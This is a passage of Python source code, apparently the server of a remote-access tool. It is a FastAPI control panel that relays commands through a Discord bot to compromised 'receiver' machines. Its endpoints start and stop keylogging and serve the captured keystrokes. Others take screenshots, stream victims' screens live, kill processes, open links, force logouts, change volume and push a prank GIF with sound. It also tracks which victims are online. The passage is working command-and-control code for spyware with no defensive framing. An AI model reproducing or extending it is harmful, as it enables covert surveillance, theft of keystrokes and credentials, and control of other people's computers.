          alert('Panic request failed.');
        }
      });
    }
  </script>
</body>
</html>"""

@app.get("/")
async def index():
    return HTMLResponse(CONTROL_HTML)

@app.websocket("/audio")
async def audio_ws(ws: WebSocket):
    await ws.accept()  # ✅ REQUIRED on Render
    print("WS ACCEPTED")

    await hub.add(ws)

    try:
        while True:
            data = await ws.receive_bytes()
            await hub.broadcast_bytes(data, sender=ws)
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove(ws)


# ---------------- LIVE VIEW ----------------
@app.websocket("/live/{rid}")
async def live_ws(ws: WebSocket, rid: str, role: str = "viewer"):
    await ws.accept()
    hub = _live_hubs.setdefault(rid, LiveHub())
    if role == "sender":
        try:
            while True:
                data = await ws.receive_bytes()
                await hub.broadcast(data)
        except WebSocketDisconnect:
            pass
        return
    await hub.add_viewer(ws)
    if hub.latest:
        try:
            await ws.send_bytes(hub.latest)
        except Exception:
            pass
    try:
        while True:
            await ws.receive()
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove_viewer(ws)

# ---------------- COMMAND ENDPOINTS ----------------
async def _send_cmd(msg: str):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command to channel {COMMAND_CHANNEL_ID}:", msg)
        await ch.send(msg)
    except Exception as e:
        print("Send command failed:", e)

async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command with files to channel {COMMAND_CHANNEL_ID}:", msg, [p.name for p in file_paths])
        files = []
        for p in file_paths:
            try:
                files.append(discord.File(fp=str(p), filename=p.name))
            except Exception as e:
                print("Skipping file attach failed:", p, e)
                continue
        if not files:
            await ch.send(f"{msg} (no files attached)")
            return
        await ch.send(content=msg, files=files)
    except Exception as e:
        print("Send command with files failed:", e)

async def _wait_controller_ready(timeout: float = 5.0) -> bool:
    try:
        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
        return True
    except asyncio.TimeoutError:
        print("Discord bot not ready after wait; controller may not be connected.")
        return False

def _cmd_with_selection(cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if _selected_receiver:
        return f"TARGET {_selected_receiver} {base}"
    return f"TARGET NONE {base}"

def _cmd_for_receiver(rid: Optional[str], cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if rid:
        return f"TARGET {rid} {base}"
    return f"TARGET NONE {base}"

def _build_live_ws_url(request: Request, rid: str) -> str:
    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
    ws_scheme = "wss" if scheme == "https" else "ws"
    host = request.headers.get("x-forwarded-host") or request.headers.get("host") or request.url.netloc
    return f"{ws_scheme}://{host}/live/{rid}?role=sender"

async def _read_form_value(request: Request, name: str) -> Optional[str]:
    try:
        form = await request.form()
        value = form.get(name)
        if value is not None:
            return str(value)
    except Exception:
        pass
    try:
        body = await request.body()
        if body:
            parsed = parse_qs(body.decode("utf-8", errors="ignore"))
            if name in parsed and parsed[name]:
                return parsed[name][0]
    except Exception:
        pass
    try:
        data = await request.json()
        if isinstance(data, dict) and name in data:
            return str(data.get(name))
    except Exception:
        pass
    return request.query_params.get(name)

@app.post("/cmd/gif/start")
async def gif_start():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_START"))
    _set_receiver_mode(_selected_receiver, "gif")
    return JSONResponse({"ok": True})

@app.post("/cmd/gif/stop")
async def gif_stop():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
    _set_receiver_mode(_selected_receiver, "")
    return JSONResponse({"ok": True})

@app.get("/api/screenshot")
async def api_screenshot():
    return JSONResponse(_latest_screenshot)

@app.get("/api/screenshots")
async def api_screenshots():
    return JSONResponse({"items": list(reversed(_screenshot_log))})

@app.get("/api/logs")
async def api_logs():
    return JSONResponse(_latest_keylog)

@app.get("/api/messages")
async def api_messages():
    text = "\n".join(_dm_messages)
    latest = _latest_dm_user.get("name", "")
    return JSONResponse({"text": text, "latest": latest})

@app.get("/api/receivers")
async def api_receivers():
    now = time.time()
    _prune_receivers(now)
    online = []
    offline = []
    for rid, info in _receivers.items():
        alias = info.get("alias") or ""
        display = alias or info.get("tag") or rid
        status, status_key, is_online = _receiver_status(info, now)
        data = {
            "id": rid,
            "name": display,
            "tag": info.get("tag"),
            "alias": alias,
            "last_seen": info.get("last_seen", 0),
            "status": status,
            "status_key": status_key,
            "online": is_online,
        }
        if is_online:
            online.append(data)
        else:
            offline.append(data)
    return JSONResponse({"online": online, "offline": offline, "selected": _selected_receiver})

@app.post("/ui/surprise")
async def ui_surprise():
    # Prefer M.gif for display
    img = None
    for name in ("M.gif",):
        candidate = ROOT_DIR / name
        if candidate.is_file():
            img = candidate
            break
    sound = ROOT_DIR / "sound.mp3"

    files = [p for p in (img, sound) if p and p.is_file()]
    if not files:
        return HTMLResponse("Missing M.gif and sound.mp3 next to main.py", status_code=400)

    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd_with_files(_cmd_with_selection("DISPLAY_GIF_START"), files)
    _set_receiver_mode(_selected_receiver, "gif")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/gif/stop")
async def ui_gif_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await gif_stop()
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/start")
async def ui_logs_start():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_START"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/stop")
async def ui_logs_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_STOP"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logout")
async def ui_logout():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGOUT"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/open")
async def ui_open(request: Request):
    url = await _read_form_value(request, "url")
    if url:
        msg = _cmd_with_selection("OPEN_LINK", url)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/close")
async def ui_close(request: Request):
    proc = await _read_form_value(request, "proc")
    if proc:
        msg = _cmd_with_selection("KILL_PROCESS", proc)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/volume")
async def ui_volume(request: Request):
    level = await _read_form_value(request, "level")
    if level:
        msg = _cmd_with_selection("SET_VOLUME", level)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/screenshot")
async def ui_screenshot():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("SCREENSHOT"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/start")
async def ui_live_start(request: Request):
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    ws_url = _build_live_ws_url(request, _selected_receiver)
    await _send_cmd(_cmd_with_selection("LIVE_START", ws_url))
    _set_receiver_mode(_selected_receiver, "live")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/stop")
async def ui_live_stop():
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
    _set_receiver_mode(_selected_receiver, "")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/rename/{rid}")
async def ui_rename(rid: str, request: Request):
    alias = await _read_form_value(request, "alias")
    _prune_receivers()
    if rid in _receivers and alias is not None:
        cleaned = alias.strip()
        if cleaned:
            _receivers[rid]["alias"] = cleaned
            _save_state()
        else:
            _receivers[rid].pop("alias", None)
            _save_state()
    if request.headers.get("X-Requested-With") == "fetch":
        return JSONResponse({"ok": True, "id": rid, "alias": alias or ""})
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/panic")
async def ui_panic():
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("PANIC"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/messages/reply")
async def ui_messages_reply():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    user_id = _latest_dm_user.get("id")
    if not user_id:
        return HTMLResponse("No recent DM user", status_code=400)
    try:
        user = await bot.fetch_user(int(user_id))
        await user.send(DM_REPLY_TEXT)
    except Exception as e:
        return HTMLResponse(f"Failed to DM user: {e}", status_code=500)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/select/{tag}")
async def ui_select(tag: str):
    global _selected_receiver
    _prune_receivers()
    if tag in _receivers:
        _selected_receiver = tag
        _save_state()
    return RedirectResponse(url="/", status_code=303)


# ---------------- STARTUP ----------------
@app.on_event("startup")
async def startup():
    async def run_bot():
        try:
            await bot.start(CONTROLLER_TOKEN)
        except Exception as e:
            print("Bot failed:", e)
            global _controller_error
            _controller_error = str(e)
            _controller_ready.set()
    asyncio.create_task(run_bot())
